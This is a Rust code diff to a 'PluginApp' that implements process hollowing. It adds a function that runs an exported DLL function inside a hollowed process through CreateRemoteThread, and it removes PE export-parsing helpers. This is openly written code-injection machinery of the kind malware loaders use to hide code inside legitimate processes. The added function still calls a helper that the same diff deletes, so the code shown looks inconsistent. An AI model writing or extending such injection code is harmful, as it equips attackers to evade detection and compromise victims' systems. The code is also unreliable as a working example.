@@ -15,8 +15,42 @@ use rand;
 
 
 impl PluginApp {
+    /// Call an exported DLL function in a hollowed process
+    /// Arguments:
+    /// - process_handle: HANDLE to the hollowed process
+    /// - dll_data: &[u8] of the DLL image
+    /// - dll_base: base address where DLL is mapped in remote process
+    /// - export_name: name of the exported function to call
+    pub unsafe fn call_export_in_hollowed_process(
+        process_handle: HANDLE,
+        dll_data: &[u8],
+        dll_base: usize,
+        export_name: &str,
+    ) -> Result<(), String> {
+        // Get the RVA of the export
+        let export_rva = Self::get_export_rva(dll_data, export_name)?;
+        let remote_addr = dll_base + export_rva as usize;
+        // Create remote thread at the export address
+        let thread_handle = unsafe { 
+            CreateRemoteThread(
+                process_handle,
+                None,
+                0,
+                Some(std::mem::transmute(remote_addr)),
+                None,
+                0,
+                None,
+            ).map_err(|e| e.to_string()) 
+        }?;
+        if thread_handle.is_invalid() {
+            return Err("CreateRemoteThread failed".to_string());
+        }
+        WaitForSingleObject(thread_handle, INFINITE);
+        CloseHandle(thread_handle).map_err(|e| e.to_string())?;
+        Ok(())
+    }
     // Improved process hollowing with proper PE handling
-    pub unsafe fn hollow_process(exe_path: &str) -> Result<PROCESS_INFORMATION, String> {
+    pub unsafe fn get_process_info(exe_path: &str) -> Result<PROCESS_INFORMATION, String> {
         unsafe {
             let mut startup_info = STARTUPINFOA::default();
             let mut process_info = PROCESS_INFORMATION::default();
@@ -711,101 +745,6 @@ impl PluginApp {
             }
             None
         }
-    }
-
-    // Helper functions for advanced PE manipulation
-
-    pub fn rva_to_offset(data: &[u8], rva: usize) -> Result<usize, String> {
-        let e_lfanew = u32::from_le_bytes(data[0x3C..0x40].try_into().unwrap()) as usize;
-        let number_of_sections = u16::from_le_bytes(data[e_lfanew + 6..e_lfanew + 8].try_into().unwrap()) as usize;
-        let optional_header_size = u16::from_le_bytes(data[e_lfanew + 20..e_lfanew + 22].try_into().unwrap()) as usize;
-        let section_table = e_lfanew + 24 + optional_header_size;
-
-        for i in 0..number_of_sections {
-            let offset = section_table + i * 40;
-            let virtual_address = u32::from_le_bytes(data[offset + 12..offset + 16].try_into().unwrap()) as usize;
-            let size_of_raw_data = u32::from_le_bytes(data[offset + 16..offset + 20].try_into().unwrap()) as usize;
-            let pointer_to_raw_data = u32::from_le_bytes(data[offset + 20..offset + 24].try_into().unwrap()) as usize;
-
-            if rva >= virtual_address && rva < virtual_address + size_of_raw_data {
-                return Ok(rva - virtual_address + pointer_to_raw_data);
-            }
-        }
-
-        Err("Could not get Offset from RVA".to_string())
-    }
-
-    pub fn get_export_rva(data: &[u8], function_name: &str) -> Result<u32, String> {
-        if data.len() < 64 || &data[0..2] != b"MZ" {
-            return Err("Invalid DOS header".to_string());
-        }
-
-        let e_lfanew = u32::from_le_bytes(data[0x3C..0x40].try_into().unwrap()) as usize;
-        if &data[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
-            return Err("Invalid NT header".to_string());
-        }
-
-        let optional_header = &data[e_lfanew + 0x18..];
-        let magic = u16::from_le_bytes(optional_header[0..2].try_into().unwrap());
-
-        let export_dir_rva = if magic == 0x10B {
-            u32::from_le_bytes(optional_header[96..100].try_into().unwrap()) as usize // PE32
-        } else if magic == 0x20B {
-            u32::from_le_bytes(optional_header[112..116].try_into().unwrap()) as usize // PE32+
-        } else {
-            return Err("Unknown PE magic".to_string());
-        };
-
-        let export_offset = Self::rva_to_offset(data, export_dir_rva).map_err(|e| format!("Invalid export directory RVA: {e}"))?;
-
-        let number_of_names = u32::from_le_bytes(data[export_offset + 24..export_offset + 28].try_into().unwrap()) as usize;
-
-        let address_of_functions_rva = u32::from_le_bytes(data[export_offset + 28..export_offset + 32].try_into().unwrap()) as usize;
-        let address_of_names_rva = u32::from_le_bytes(data[export_offset + 32..export_offset + 36].try_into().unwrap()) as usize;
-        let address_of_name_ordinals_rva = u32::from_le_bytes(data[export_offset + 36..export_offset + 40].try_into().unwrap()) as usize;
-
-        let address_of_functions = Self::rva_to_offset(data, address_of_functions_rva).map_err(|e| format!("Invalid AddressOfFunctions RVA: {e}"))?;
-        let address_of_names = Self::rva_to_offset(data, address_of_names_rva).map_err(|e| format!("Invalid AddressOfNames RVA: {e}"))?;
-        let address_of_name_ordinals = Self::rva_to_offset(data, address_of_name_ordinals_rva).map_err(|e| format!("Invalid AddressOfNameOrdinals RVA: {e}"))?;
-
-        for i in 0..number_of_names {
-            // This is correct: reading RVA of i-th name string
-            let name_rva = u32::from_le_bytes(
-                data[address_of_names + i * 4..address_of_names + i * 4 + 4].try_into().unwrap()
-            ) as usize;
-
-            // Convert name RVA -> file offset
-            let name_offset = Self::rva_to_offset(data, name_rva)
-                .map_err(|e| format!("Invalid name_offset RVA: {e}"))?;
-
-            // Read the null-terminated name string
-            let name_end = data[name_offset..]
-                .iter()
-                .position(|&b| b == 0)
-                .unwrap_or(data.len() - name_offset)
-                + name_offset;
-
-            let name = std::str::from_utf8(&data[name_offset..name_end])
-                .map_err(|e| format!("Invalid name UTF-8: {e}"))?;
-
-            if name == function_name {
-                let ordinal = u16::from_le_bytes(
-                    data[address_of_name_ordinals + i * 2..address_of_name_ordinals + i * 2 + 2]
-                        .try_into()
-                        .unwrap(),
-                ) as usize;
-
-                let rva = u32::from_le_bytes(
-                    data[address_of_functions + ordinal * 4..address_of_functions + ordinal * 4 + 4]
-                        .try_into()
-                        .unwrap(),
-                );
-
-                return Ok(rva);
-            }
-        }
-
-        Err("Function not found in export table".to_string())
     }
 
     fn parse_pe_headers(dll_data: &[u8]) -> Result<(usize, u32, usize), String> {
